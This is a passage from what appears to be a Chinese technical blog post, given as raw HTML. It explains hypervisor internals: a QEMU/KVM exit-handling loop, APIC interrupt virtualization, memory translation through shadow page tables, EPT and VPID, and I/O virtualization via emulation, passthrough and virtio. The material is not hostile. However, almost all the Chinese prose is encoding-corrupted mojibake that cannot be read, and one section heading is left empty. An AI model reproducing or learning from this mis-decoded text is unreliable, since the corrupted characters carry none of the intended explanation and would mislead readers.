ret = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> KVM_EXIT_MMIO:<br>            DPRINTF(<span class="hljs-string">&quot;handle_mmio\n&quot;</span>);<br>            <span class="hljs-comment">/* Called outside BQL */</span><br>            address_space_rw(&amp;address_space_memory,<br>                             run-&gt;mmio.phys_addr, attrs,<br>                             run-&gt;mmio.data,<br>                             run-&gt;mmio.len,<br>                             run-&gt;mmio.is_write);<br>            ret = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">//...</span><br>        <span class="hljs-keyword">default</span>:<br>            DPRINTF(<span class="hljs-string">&quot;kvm_arch_handle_exit\n&quot;</span>);<br>            ret = kvm_arch_handle_exit(cpu, run);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">while</span> (ret == <span class="hljs-number">0</span>);<br>    <br>    <span class="hljs-comment">/* è¿è¡Œç»“æŸï¼Œæ”¶å°¾å¤„ç† */</span><br>    <span class="hljs-comment">// ...</span><br></code></pre></td></tr></table></figure><h1>0x04.ä¸­æ–­è™šæ‹ŸåŒ–</h1><p><strong>ä¸­æ–­</strong>ï¼ˆInterruptï¼‰æœºåˆ¶æ˜¯ä¸€ç§ç”¨æ¥é€šçŸ¥ CPU å‘ç”Ÿäº†éœ€è¦å¤„ç†çš„äº‹ä»¶çš„æœºåˆ¶ï¼ŒæŒ‰ç…§å‘ç”Ÿçš„ä½ç½®åˆ†ä¸ºå¤–éƒ¨ä¸­æ–­ï¼ˆæ¥è‡ªå¤–éƒ¨çš„ä¸­æ–­ï¼ŒINTR å¼•è„šä¼ æ¥çš„ä¸ºå¯å±è”½ä¸­æ–­ï¼ŒNMI å¼•è„šä¼ æ¥çš„ä¸ºä¸å¯å±è”½ä¸­æ–­ï¼‰ä¸å†…éƒ¨ä¸­æ–­ï¼ˆè½¯ä¸­æ–­ã€å¼‚å¸¸ã€é™·é˜±ç­‰ï¼‰ï¼Œå®æ¨¡å¼ä¸‹ CPU æ ¹æ®ä¸­æ–­å‘é‡è¡¨æ¥å¯»æ‰¾å¯¹åº”çš„å¤„ç†ç¨‹åºï¼Œä¿æŠ¤æ¨¡å¼ä¸‹åˆ™é€šè¿‡ä¸­æ–­æè¿°ç¬¦è¡¨æ¥å¯»æ‰¾å¤„ç†ç¨‹åº</p><p>ç°ä»£ X86 å¤„ç†å™¨ä½¿ç”¨çš„ä¸­æ–­æ§åˆ¶å™¨ç§°ä¹‹ä¸º <strong>APIC</strong>(Advanced Programmable Interrupt Controller)ï¼Œæ‰€æœ‰çš„æ ¸å¿ƒå…±ç”¨ä¸€ä¸ª I/O APIC ï¼Œç”¨äºæ¥æ”¶å¤–éƒ¨ä¸­æ–­ï¼ŒåŒæ—¶æ¯ä¸ªæ ¸ç‹¬ç«‹æœ‰ç€ä¸€ä¸ª <strong>Local APIC</strong>ï¼Œç”¨äºæ¥æ”¶æ¥è‡ª I/O APIC çš„ä¸­æ–­ä¿¡æ¯ã€å†…éƒ¨æ—¶é’Ÿä¸­æ–­ã€æ¥è‡ªå…¶ä»–æ ¸å¿ƒçš„ä¸­æ–­ï¼ˆ<strong>Inter-Processor Interrupt</strong>ï¼ŒIPIï¼‰ç­‰</p><p><img src="https://s2.loli.net/2022/08/29/BWGZpyebmVXCcLJ.png" alt="image.png"></p><p>åœ¨è™šæ‹ŸåŒ–ç¯å¢ƒå½“ä¸­ï¼Œæ¯ä¸ª vCPU éƒ½å¯¹åº”éœ€è¦æœ‰ä¸€ä¸ª virtual LAPICï¼Œæ‰€æœ‰çš„æ ¸å¿ƒåˆ™éœ€è¦å…±äº«ä¸€ä¸ª virtual I/O APICï¼Œè¿™éƒ½æ˜¯éœ€è¦ Hypervisor è¿›è¡Œæ¨¡æ‹Ÿä¸ç»´æŠ¤çš„</p><h2 id="ä¸€ã€åŸºæœ¬æ¨¡å‹-2">ä¸€ã€åŸºæœ¬æ¨¡å‹</h2><h1>0x05. å†…å­˜è™šæ‹ŸåŒ–</h1><p>å†…å­˜è™šæ‹ŸåŒ–æœ¬è´¨ä¸Šæ˜¯éœ€è¦è¾¾æˆä»¥ä¸‹ä¸¤ä¸ªç›®çš„ï¼š</p><ul><li>æä¾›ä¸€ä¸ªåœ¨ Guest æ„ŸçŸ¥ä¸­çš„ä»é›¶å¼€å§‹çš„è¿ç»­ç‰©ç†å†…å­˜ç©ºé—´</li><li>åœ¨å„ä¸ª VM ä¹‹é—´è¿›è¡Œæœ‰æ•ˆçš„éš”ç¦»ã€è°ƒåº¦ã€å…±äº«å†…å­˜èµ„æº</li></ul><h2 id="ä¸€ã€çº¯è½¯ä»¶å®ç°è™šæ‹ŸåŒ–-2">ä¸€ã€çº¯è½¯ä»¶å®ç°è™šæ‹ŸåŒ–</h2><h3 id="I-è™šæ‹Ÿæœºå†…å­˜è®¿é—®åŸç†åŠé‡åˆ°çš„é—®é¢˜">I.è™šæ‹Ÿæœºå†…å­˜è®¿é—®åŸç†åŠé‡åˆ°çš„é—®é¢˜</h3><p>ä¸ºäº†å®ç°å†…å­˜ç©ºé—´çš„éš”ç¦»ï¼ŒHypervisor éœ€è¦ä¸º Guest VM å‡†å¤‡ä¸€å±‚æ–°çš„åœ°å€ç©ºé—´ï¼š<code>Guest Physical Address Space</code>ï¼Œä» Guest ä¾§å…¶åªèƒ½çœ‹åˆ°è¿™ä¸€å±‚åœ°å€ç©ºé—´ï¼ŒHypervisor éœ€è¦è®°å½•ä» GPA åˆ° HVA ä¹‹é—´çš„è½¬æ¢å…³ç³»</p><p>ä¸‹å›¾ä¸º Qemu çš„å†…å­˜æ¶æ„ï¼š</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">Guest&#x27; processes<br>                     +--------------------+<br>Virtual addr space   |<span class="hljs-string">                    </span>|<br>                     +--------------------+                                    ï¼ˆGVAï¼‰<br>                     |<span class="hljs-string">                    </span>|<br>                     \__   Page Table     \__<br>                        \                    \<br>                         |<span class="hljs-string">                    </span>|<span class="hljs-string">  Guest kernel</span><br><span class="hljs-string">                    +----+--------------------+----------------+</span><br><span class="hljs-string">Guest&#x27;s phy  memory </span>|<span class="hljs-string">    </span>|<span class="hljs-string">                    </span>|<span class="hljs-string">                </span>|<span class="hljs-string">            ï¼ˆGPAï¼‰</span><br><span class="hljs-string">                    +----+--------------------+----------------+</span><br><span class="hljs-string">                    </span>|<span class="hljs-string">                                          </span>|<br>                    \__                                        \__<br>                       \                                          \<br>                        |<span class="hljs-string">             QEMU process                 </span>|<br>                   +----+------------------------------------------+<br>Virtual addr space |<span class="hljs-string">    </span>|<span class="hljs-string">                                          </span>|<span class="hljs-string">         ï¼ˆHVAï¼‰</span><br><span class="hljs-string">                   +----+------------------------------------------+</span><br><span class="hljs-string">                   </span>|<span class="hljs-string">                                               </span>|<br>                    \__                Page Table                   \__<br>                       \                                               \<br>                        |<span class="hljs-string">                                               </span>|<br>                   +----+-----------------------------------------------+----+<br>Physical memory    |<span class="hljs-string">    </span>|<span class="hljs-string">                                               </span>|<span class="hljs-string">    </span>|<span class="hljs-string">    ï¼ˆHPAï¼‰</span><br><span class="hljs-string">                   +----+-----------------------------------------------+----+</span><br></code></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬è¦è®¿é—® Guest ä¸­æŸä¸ªè™šæ‹Ÿåœ°å€ä¸Šçš„æ•°æ®æ—¶ï¼Œæˆ‘ä»¬éœ€è¦ï¼š</p><ul><li>é¦–å…ˆå¾—å…ˆé€šè¿‡ Guest çš„é¡µè¡¨å°† <code>Guest Virtual Address</code> ï¼ˆGVAï¼‰è½¬æ¢ä¸º <code>Guest Physical Address</code>ï¼ˆGPAï¼‰</li><li>GPA åœ¨ Qemu çš„å®ç°å½“ä¸­å®é™…ä¸Šæ˜¯å¯¹åº”æ˜ å°„åˆ° Host ä¸­ä¸€å¤§å— mmap çš„å†…å­˜ä¸Šçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦å°† GPA å†è½¬æ¢ä¸º <code>Host Virtual Address</code>ï¼ˆHVAï¼‰</li><li>æœ€åå†é€šè¿‡ Host ä¸Šçš„é¡µè¡¨å°† HVA è½¬åŒ–ä¸º <code>Host Physical Address</code>ï¼ˆHPAï¼‰</li><li>åœ¨ Guest å¤šçº§é¡µè¡¨çš„å¯»å€å½“ä¸­åŒæ ·ä¹Ÿè¦å¤šæ¬¡ç»è¿‡ <code>GPA-&gt;HPA</code> çš„è½¬æ¢æŸ¥è¯¢è¿‡ç¨‹</li></ul><p>è¿™ä¸€æ•´å¥—æµç¨‹<strong>éå¸¸ç¹é‡</strong>ï¼Œä»è€Œä½¿å¾—è™šæ‹Ÿæœºä¸­å†…å­˜è®¿é—®çš„æ€§èƒ½æä¸ºä½ä¸‹</p><blockquote><p>åœ¨ QEMU å½“ä¸­è®¿é—®å†…å­˜çš„æ ¸å¿ƒå‡½æ•°æ˜¯ <code>address_space_rw()</code>ï¼Œæ„Ÿå…´è¶£çš„åŒå­¦å¯ä»¥çœ‹ä¸€ä¸‹å…¶å†…éƒ¨å®ç°ï¼Œè™½ç„¶è¯´åªæ˜¯ GPA-&gt;HVAï¼ˆç¬‘ï¼‰</p></blockquote><h3 id="II-å½±å­é¡µè¡¨-ï¼ˆshadow-page-tableï¼‰">II.å½±å­é¡µè¡¨ ï¼ˆshadow page tableï¼‰</h3><p>åœ¨æ—©æœŸçš„æ—¶å€™ Intel ç¡¬ä»¶å¯¹è™šæ‹ŸåŒ–å¹¶æ²¡æœ‰å¾ˆå¥½çš„æ”¯æŒï¼Œå› æ­¤ Hypervisor åªèƒ½å…ˆåœ¨è½¯ä»¶å±‚é¢è¿›è¡Œä¼˜åŒ–â€”â€”<strong>å½±å­é¡µè¡¨</strong>ï¼ˆShadow Page Tableï¼‰åº”è¿è€Œç”Ÿ</p><p>ä»¥ Intel ä¸ºä¾‹ï¼Œç”±äºè¯»å†™ CR3 å¯„å­˜å™¨ï¼ˆå­˜æ”¾é¡µé¡¶çº§è¡¨æŒ‡é’ˆï¼‰çš„æ“ä½œæ˜¯æ•æ„ŸæŒ‡ä»¤ï¼Œæˆ‘ä»¬çš„ Hypervisor å¯ä»¥å¾ˆè½»æ˜“åœ°æˆªè· VM çš„è¿™ä¸ªæ“ä½œï¼Œ<strong>å¹¶å°†é¡µè¡¨æ›¿æ¢ä¸ºå­˜æ”¾ GVAâ†’HPA æ˜ å°„å…³ç³»çš„å½±å­é¡µè¡¨</strong>ï¼Œè¿™æ ·å°±èƒ½<strong>ç›´æ¥å®Œæˆç”± GVA åˆ° HPA çš„è½¬æ¢è¿‡ç¨‹</strong></p><p><img src="https://s2.loli.net/2022/08/05/eG1hpBbZy6Edszg.png" alt="image.png"></p><p>ä¸ºäº†å®ç°å½±å­é¡µè¡¨ï¼Œæˆ‘ä»¬æœ¬è´¨ä¸Šéœ€è¦å®ç°<strong>MMU è™šæ‹ŸåŒ–</strong>ï¼š</p><ul><li>Guest VM æ‰€èƒ½çœ‹åˆ°ä¸æ“ä½œçš„å®é™…éƒ½ä¸Šæ˜¯è™šæ‹Ÿçš„ MMUï¼ŒçœŸæ­£è½½å…¥ MMU çš„é¡µè¡¨æ˜¯ç”± Hypevisor å®Œæˆç¿»è¯‘åæ‰€äº§ç”Ÿçš„<strong>å½±å­é¡µè¡¨</strong></li><li>å½±å­é¡µè¡¨ä¸­çš„è®¿é—®æƒé™ä¸º<strong>åªè¯»çš„</strong>ï¼Œå½“ Guest æƒ³è¦è¯»å†™é¡µè¡¨æ—¶ä¾¿èƒ½è¢« Hypervisor æ•è·åˆ°è¿™ä¸ªæ“ä½œå¹¶ä»£ä¸ºå¤„ç†</li></ul><p>ä¸è¿‡è¿™ç§æ–¹æ³•çš„ç¼ºç‚¹å°±æ˜¯<strong>æˆ‘ä»¬éœ€è¦ä¸º Guest VM ä¸­çš„æ¯å¥—é¡µè¡¨éƒ½ç‹¬ç«‹ç»´æŠ¤ä¸€ä»½å½±å­é¡µè¡¨ï¼Œä¸”éœ€è¦å¤šæ¬¡åœ¨ VMM ä¸ VM é—´è¿›è¡Œåˆ‡æ¢ï¼Œè¿™å…·æœ‰ä¸€å®šçš„å¼€é”€</strong></p><h2 id="äºŒã€ç¡¬ä»¶è¾…åŠ©è™šæ‹ŸåŒ–">äºŒã€ç¡¬ä»¶è¾…åŠ©è™šæ‹ŸåŒ–</h2><h3 id="III-æ‰©å±•é¡µè¡¨ï¼ˆExtend-Page-Table-EPTï¼‰">III.æ‰©å±•é¡µè¡¨ï¼ˆExtend Page Table, EPTï¼‰</h3><p>ä»è½¯ä»¶å±‚é¢ä¼¼ä¹å·²ç»æ˜¯éš¾ä»¥æœ‰æ›´å¥½çš„ä¼˜åŒ–çš„æ–¹æ¡ˆäº†ï¼Œå› æ­¤ç¡¬ä»¶å±‚é¢çš„å¯¹å†…å­˜è™šæ‹ŸåŒ–çš„æ”¯æŒä¾¿åº”è¿è€Œç”Ÿâ€”â€”<strong>EPT</strong> å³ <strong>Extend Page Table</strong>ï¼Œæ˜¯ Intel ä¸ºå®ç°å†…å­˜è™šæ‹ŸåŒ–è€Œæ–°å¢çš„ç‰¹æ€§ï¼Œç›®çš„æ˜¯ä¸ºäº†å‡å°‘å†…å­˜è®¿é—®çš„å¼€é”€</p><p>EPT å¹¶ä¸å¹²æ‰° Guest VM æ“ä½œè‡ªèº«é¡µè¡¨çš„è¿‡ç¨‹ï¼Œå…¶æœ¬è´¨ä¸Šæ˜¯<strong>é¢å¤–æä¾›äº†ä¸€ä¸ª Guest ç‰©ç†åœ°å€ç©ºé—´åˆ° Host ç‰©ç†åœ°å€ç©ºé—´è½¬æ¢çš„é¡µè¡¨</strong>ï¼Œå³ä½¿ç”¨ä¸€ä¸ªé¢å¤–çš„é¡µè¡¨æ¥å®Œæˆ <code>GPAâ†’HPA</code> çš„è½¬æ¢</p><p>EPT æ–¹æ¡ˆè™½ç„¶ç›¸æ¯”èµ·å½±å­é¡µè¡¨è€Œè¨€å¤šäº†ä¸€å±‚è½¬æ¢ï¼Œä½†æ˜¯å¹¶ä¸éœ€è¦å¹²æ‰° Guest åŸæœ‰çš„é¡µè¡¨ç®¡ç†ï¼Œ<strong>GVAâ†’GPAâ†’HPA çš„è¿‡ç¨‹éƒ½ç”±ç¡¬ä»¶è‡ªåŠ¨å®Œæˆ</strong>ï¼ŒåŒæ—¶ Hypervisor ä»…éœ€è¦æˆªè· <code>EPT Violation</code> å¼‚å¸¸ï¼ˆEPT è¡¨é¡¹ä¸ºç©ºï¼‰ï¼Œæ•ˆç‡æé«˜äº†ä¸å°‘</p><p><img src="https://s2.loli.net/2022/08/05/BSjJk3zq6ayrXvO.png" alt="image.png"></p><h3 id="IV-VPIDï¼šTLB-èµ„æºä¼˜åŒ–">IV. VPIDï¼šTLB èµ„æºä¼˜åŒ–</h3><p><strong>Translation Lookaside Buffer</strong>ä¸ºç”¨ä»¥åŠ å¿«è™šæ‹Ÿåœ°å€åˆ°ç‰©ç†åœ°å€è½¬æ¢çš„<strong>é¡µè¡¨é¡¹ç¼“å­˜</strong>ï¼Œå½“è¿›è¡Œåœ°å€è½¬æ¢æ—¶ CPU é¦–å…ˆä¼šå…ˆæŸ¥è¯¢ TLBï¼ŒTLB æ ¹æ®è™šæ‹Ÿåœ°å€æŸ¥æ‰¾æ˜¯å¦å­˜åœ¨å¯¹åº”çš„ cacheï¼Œè‹¥ cache miss äº†æ‰ä¼šæŸ¥è¯¢é¡µè¡¨</p><p>ç”±äº TLB æ˜¯ä¸å¯¹åº”çš„é¡µè¡¨è¿›è¡Œå·¥ä½œçš„ï¼Œå› æ­¤åœ¨åˆ‡æ¢é¡µè¡¨æ—¶ TLB åŸæœ‰çš„å†…å®¹å°±å¤±æ•ˆäº†ï¼Œæ­¤æ—¶æˆ‘ä»¬åº”å½“ä½¿ç”¨ <code>INVLPG</code> ä½¿ TLB å¤±æ•ˆï¼Œç±»ä¼¼åœ°ï¼Œåœ¨ VM-Entry ä¸ VM-Exit æ—¶ CPU éƒ½ä¼šå¼ºåˆ¶è®© TLB å¤±æ•ˆï¼Œä½†è¿™ä¹ˆåšä»å­˜åœ¨ä¸€å®šçš„æ€§èƒ½æŸè€—</p><p><strong>Virtual Processor Identifier</strong>ï¼ˆVPIDï¼‰åˆ™æ˜¯ä¸€ç§ç¡¬ä»¶çº§çš„å¯¹ TLB èµ„æºç®¡ç†çš„ä¼˜åŒ–ï¼Œå…¶åœ¨ç¡¬ä»¶ä¸Šä¸ºæ¯ä¸ª TLB è¡¨é¡¹æ‰“ä¸Šä¸€ä¸ª VPID æ ‡è¯†ï¼ˆVMM ä¸ºæ¯ä¸ª vCPU åˆ†é…ä¸€ä¸ªå”¯ä¸€çš„ VPIDï¼Œå­˜æ”¾åœ¨ VMCS ä¸­ï¼Œé€»è¾‘ CPU çš„ VPID ä¸º 0ï¼‰ï¼Œåœ¨ CPU æŸ¥æ‰¾ TLB cache æ—¶ä¼šå…ˆæ¯”å¯¹ VPIDï¼Œè¿™æ ·æˆ‘ä»¬å°±æ— éœ€åœ¨æ¯æ¬¡è¿›è¡Œ VM entry/exit æ—¶åˆ·æ‰æ‰€æœ‰çš„ cacheï¼Œè€Œå¯ä»¥ç»§ç»­å¤ç”¨ä¹‹å‰ä¿ç•™çš„ cache</p><h1>0x06. I/O è™šæ‹ŸåŒ–</h1><p>ç°å®çš„å¤–è®¾èµ„æºå¾€å¾€æ˜¯æœ‰é™çš„ï¼ŒåŒæ—¶æˆ‘ä»¬æœ‰çš„æ—¶å€™å¹¶ä¸éœ€è¦è®© VM ç›´æ¥æ¥è§¦åˆ°ç°å®å­˜åœ¨çš„å¤–è®¾èµ„æºï¼Œæœ‰çš„æ—¶å€™æˆ‘ä»¬è¿˜æƒ³ä¸º VM æä¾›ä¸€äº›ä¸å­˜åœ¨å®ä½“è®¾å¤‡çš„è®¾å¤‡ï¼Œå› æ­¤ Hypervisor éœ€è¦é€šè¿‡ IO è™šæ‹ŸåŒ–çš„æ–¹å¼æ¥ä¸º VM æä¾›<strong>è™šæ‹Ÿçš„è®¾å¤‡èµ„æº</strong></p><p>ä»å¤„ç†å™¨çš„è§’åº¦è€Œè¨€ï¼Œæˆ‘ä»¬ä¸å¤–è®¾ä¹‹é—´çš„äº¤äº’ä¸»è¦æ˜¯é€šè¿‡ <code>MMIO</code> ä¸ <code>Port IO</code> æ¥å®Œæˆçš„ï¼Œå› è€Œé’ˆå¯¹å¤–è®¾çš„è™šæ‹ŸåŒ–ç§°ä¹‹ä¸º <strong>I/O è™šæ‹ŸåŒ–</strong></p><p>I/O è™šæ‹ŸåŒ–éœ€è¦å®ç°ä»¥ä¸‹ä¸‰ä¸ªä»»åŠ¡ï¼š</p><ul><li>è®¿é—®æˆªè·ï¼šHypervisor éœ€è¦æˆªè· VM å¯¹å¤–è®¾çš„è®¿é—®æ“ä½œ</li><li>æä¾›è®¾å¤‡æ¥å£ï¼šHypervisor éœ€è¦ä¸º VM æä¾›è™šæ‹Ÿ/ç›´é€šè®¾å¤‡çš„æ¥å£</li><li>å®ç°è®¾å¤‡åŠŸèƒ½ï¼šHypervisor éœ€è¦å®ç°è™šæ‹Ÿè®¾å¤‡çš„åŠŸèƒ½</li></ul><h2 id="ä¸€ã€I-O-è™šæ‹ŸåŒ–åŸºæœ¬æ¨¡å‹">ä¸€ã€I/O è™šæ‹ŸåŒ–åŸºæœ¬æ¨¡å‹</h2><blockquote><p>è¿™ä¸€èŠ‚å…¶å®æ˜¯ç¬”è€…ä¸è®°å¾—ä¸çŸ¥é“ä»€ä¹ˆæ—¶å€™å‡ºäºä»€ä¹ˆç›®çš„ä»<a href="https://developer.ibm.com/tutorials/l-pci-passthrough/">https://developer.ibm.com/tutorials/l-pci-passthrough/</a>ä¸Šç¿»è¯‘äº†ä¸€æ®µå­˜åœ¨è‰ç¨¿ç®±é‡Œï¼Œæœ€è¿‘ç¿»è‰ç¨¿ç®±å‘ç°ä¹‹å‰å±…ç„¶è¿˜ç•™å­˜æœ‰è¿™ç§ä¸œè¥¿ï¼Œæ‰€ä»¥ä¿®æ”¹ä¸€ä¸‹å°±æ”¾ä¸Šæ¥äº†XD</p></blockquote><h3 id="I-å¹³å°è®¾å¤‡æ¨¡æ‹Ÿï¼ˆPlatform-device-emulationï¼‰">I.å¹³å°è®¾å¤‡æ¨¡æ‹Ÿï¼ˆPlatform device emulationï¼‰</h3><p>QEMU å’Œ VMWare éƒ½é€‰æ‹©äº†ä»¿çœŸå‡ºä¸€ä¸ªè™šæ‹Ÿè®¾å¤‡ï¼Œä¸åŒåœ¨äºå…¶æ¨¡æ‹Ÿè®¾å¤‡çš„å®ç°æ–¹å¼ã€‚</p><h4 id="åŸºäºè™šæ‹Ÿæœºç®¡ç†ç¨‹åºçš„è®¾å¤‡æ¨¡æ‹Ÿï¼ˆHypervisor-based-device-emulationï¼‰">åŸºäºè™šæ‹Ÿæœºç®¡ç†ç¨‹åºçš„è®¾å¤‡æ¨¡æ‹Ÿï¼ˆHypervisor-based device emulationï¼‰</h4><p>åœ¨ hypervisor ï¼ˆè™šæ‹Ÿæœºç®¡ç†ç¨‹åºï¼‰ä¸­å¯¹è®¾å¤‡è¿›è¡Œä»¿çœŸæ˜¯ VMware workstation ç³»åˆ—äº§å“è¾ƒä¸ºå¸¸ç”¨çš„ä¸€ç§æ–¹å¼ï¼šåœ¨ hypervisor ä¸­æœ‰ç€å¯¹ä¸€èˆ¬è®¾å¤‡çš„ä»¿çœŸä¾› guest OS è¿›è¡Œå…±äº«ï¼ŒåŒ…æ‹¬è™šæ‹Ÿç£ç›˜ã€è™šæ‹Ÿç½‘ç»œé€‚é…å™¨ä¸å…¶ä»–çš„å¿…è¦å…ƒç´ ï¼Œè¿™ç§æ¨¡å‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2022/02/25/IQduvSe7wE4TLgq.png" alt="image.png"></p><h4 id="åœ¨ç”¨æˆ·ç©ºé—´è¿›è¡Œè®¾å¤‡æ¨¡æ‹Ÿï¼ˆUser-space-device-emulationï¼‰">åœ¨ç”¨æˆ·ç©ºé—´è¿›è¡Œè®¾å¤‡æ¨¡æ‹Ÿï¼ˆUser space device emulationï¼‰</h4><p>ç¬¬äºŒç§æ¶æ„ç§°ä¸ºç”¨æˆ·ç©ºé—´è®¾å¤‡æ¨¡æ‹Ÿï¼Œæ­£å¦‚å…¶åï¼Œç›¸æ¯”äºåœ¨ hypervisor ä¸­è¿›è¡Œæ¨¡æ‹Ÿï¼Œå…¶é€‰æ‹©äº†åœ¨ç”¨æˆ·ç©ºé—´è¿›è¡Œæ¨¡æ‹Ÿçš„æ–¹å¼ã€‚QEMUï¼ˆä¸ä»…æä¾›äº†è®¾å¤‡æ¨¡æ‹ŸåŒæ—¶è¿˜æœ‰ä¸€ä¸ª hypervisorï¼‰åœ¨ç”¨æˆ·ç©ºé—´ä¸­ç‹¬ç«‹æ¨¡æ‹Ÿäº†ä¸€ä¸ªè®¾å¤‡ï¼Œè¯¥æ¨¡æ‹Ÿè®¾å¤‡è¢«å…¶ä»–çš„ VM é€šè¿‡ hypervisor æä¾›çš„æ¥å£è¿›è¡Œè°ƒç”¨ã€‚ç”±äºè®¾å¤‡çš„æ¨¡æ‹Ÿæ˜¯ç‹¬ç«‹äº hypervisor çš„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ¨¡æ‹Ÿä»»ä½•è®¾å¤‡ï¼Œä¸”è¯¥æ¨¡æ‹Ÿè®¾å¤‡å¯ä»¥åœ¨å…¶ä»– hypervisor é—´è¿›è¡Œå…±äº«ã€‚</p><p><img src="https://s2.loli.net/2022/02/28/IQbMNCcDlXR4z5V.png" alt="image.png"></p><h3 id="II-è®¾å¤‡ç›´é€šï¼ˆDevice-passthroughï¼‰">II.è®¾å¤‡ç›´é€šï¼ˆDevice passthroughï¼‰</h3><p>ä¸Šé¢çš„è¿™ä¸¤ç§æ¨¡å‹æˆ–å¤šæˆ–å°‘éƒ½å­˜åœ¨ç€ä¸€å®šçš„æ€§èƒ½å¼€é”€ï¼Œå¦‚æœè¯¥è®¾å¤‡éœ€è¦è¢«å¤šä¸ª VM å…±äº«ï¼Œé‚£è¿™ç§å¼€é”€æˆ–è®¸æ˜¯å€¼å¾—çš„ï¼Œä½†å¦‚æœè¯¥è®¾å¤‡å¹¶ä¸éœ€è¦å…±äº«ï¼Œé‚£ä¹ˆæˆ‘ä»¬å…¶å®å¯ä»¥ä½¿ç”¨ä¸€ç§æ›´ä¸ºé«˜æ•ˆçš„æ–¹æ³•â€”â€”è®¾å¤‡ç›´é€šï¼ˆDevice passthroughï¼‰ã€‚</p><h4 id="é€šè¿‡è™šæ‹Ÿæœºç®¡ç†ç¨‹åºè¿›è¡Œç›´é€šï¼ˆPassthrough-within-the-hypervisorï¼‰">é€šè¿‡è™šæ‹Ÿæœºç®¡ç†ç¨‹åºè¿›è¡Œç›´é€šï¼ˆPassthrough within the hypervisorï¼‰</h4><p>è®¾å¤‡ç›´é€šå¯ä»¥ç†è§£ä¸ºè®¾å¤‡ç‹¬å çš„è®¾å¤‡æ¨¡æ‹Ÿï¼šç›´æ¥å°†è®¾å¤‡<strong>éš”ç¦»</strong>ç»™åˆ°æŒ‡å®šçš„ VM ä¸Šï¼Œä»¥ä¾¿è¯¥è®¾å¤‡å¯ä»¥ç”±è¯¥ VM ç‹¬å ä½¿ç”¨ã€‚<strong>è¿™æä¾›äº†æ¥è¿‘äºåŸç”Ÿè®¾å¤‡çš„æ€§èƒ½</strong>ï¼Œä¾‹å¦‚å¯¹äºä¸€äº›éœ€è¦å¤§é‡ IO çš„è®¾å¤‡ï¼ˆä¾‹å¦‚ç½‘ç»œè®¾å¤‡ç­‰ï¼‰ï¼Œä½¿ç”¨è®¾å¤‡ç›´é€šèƒ½æä¾›ç›¸å½“å®Œç¾çš„æ€§èƒ½ã€‚</p><p>ä¸‹å›¾å·¦åŠéƒ¨åˆ†ä¾¿ä¸ºè®¾å¤‡ç›´é€š</p><p><img src="https://s2.loli.net/2022/02/28/PRSNK1g4saEjvVF.png" alt="image.png"></p><h2 id="äºŒã€è½¯ä»¶åŠè™šæ‹ŸåŒ–-virtio">äºŒã€è½¯ä»¶åŠè™šæ‹ŸåŒ– - virtio</h2><p><code>virtio</code> è¿™ä¸ªæ¦‚å¿µæ¥è‡ªäºä¸€ç¯‡éå¸¸å¤è€çš„è™šæ‹ŸåŒ–é¢†åŸŸçš„è®ºæ–‡ï¼š<a href="https://ozlabs.org/~rusty/virtio-spec/virtio-paper.pdf">virtio: towards a de-facto standard for virtual I/O devices</a>ï¼Œä¸»è¦æ˜¯ä¸ºäº†è§£å†³è®¾å¤‡è™šæ‹ŸåŒ–çš„é—®é¢˜è€Œ<strong>æä¾›äº†ä¸€å¥—é€šç”¨çš„è™šæ‹ŸåŒ–è®¾å¤‡æ¨¡å‹</strong>ï¼ŒGuest OS åªéœ€è¦å®ç°ä¸€å¥—ç»Ÿä¸€çš„ virtio é©±åŠ¨ä¾¿èƒ½ä»¥ç»Ÿä¸€çš„æ–¹å¼è®¿é—®è™šæ‹ŸåŒ–è®¾å¤‡ï¼Œä»è€Œé¿å…äº†å„ç§è™šæ‹ŸåŒ–é©±åŠ¨åˆ†è£‚çš„é—®é¢˜</p><p><img src="https://s2.loli.net/2022/08/29/SZ2p17EtqRHoFQh.png" alt="image.png"></p><h3 id="I-VirtQueueï¼šä¼ è¾“å±‚æŠ½è±¡">I. VirtQueueï¼šä¼ è¾“å±‚æŠ½è±¡</h3><p><code>virtqueue</code> ä¸º virtio ä¸­ç”¨ä»¥è¿›è¡Œæ•°æ®ä¼ è¾“çš„å…³é”®ç»“æ„ï¼Œå…¶æœ¬èº«è¡¨ç¤ºä¸€ä¸ª<strong>æ•°æ®é˜Ÿåˆ—</strong>ï¼šç”±ä¸€æ–¹å‘é˜Ÿåˆ—ä¸­æ·»åŠ  bufferï¼Œå¦ä¸€æ–¹ä»é˜Ÿåˆ—ä¸­å–å‡º bufferâ€”â€”é€šè¿‡è¿™æ ·çš„æ–¹å¼å®ç°äº† Guest ä¸ Host ä¹‹é—´åŸºæœ¬çš„æ•°æ®ä¼ è¾“æ¨¡å‹</p><p>ä¸ºäº†å‡å°‘æ¨¡å‹çš„å¤æ‚æ€§ï¼Œé€šå¸¸æˆ‘ä»¬ä½¿ç”¨ virtqueue çš„ä¼ è¾“éƒ½æ˜¯å•å‘çš„ï¼Œå› æ­¤ä¸€ä¸ªæœ€ç®€å•çš„æ¨¡å‹å°±æ˜¯æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ä¸¤ä¸ª virtqueue æ¥å®ç° Guest ä¸ Host ä¹‹é—´çš„åŒå‘é€šä¿¡ï¼štx queueï¼ˆå‘é€é˜Ÿåˆ—ï¼‰ &amp; rx queueï¼ˆæ¥æ”¶é˜Ÿåˆ—ï¼‰</p><p><img src="https://s2.loli.net/2022/08/29/g1kn2r4VWO7GBLM.png" 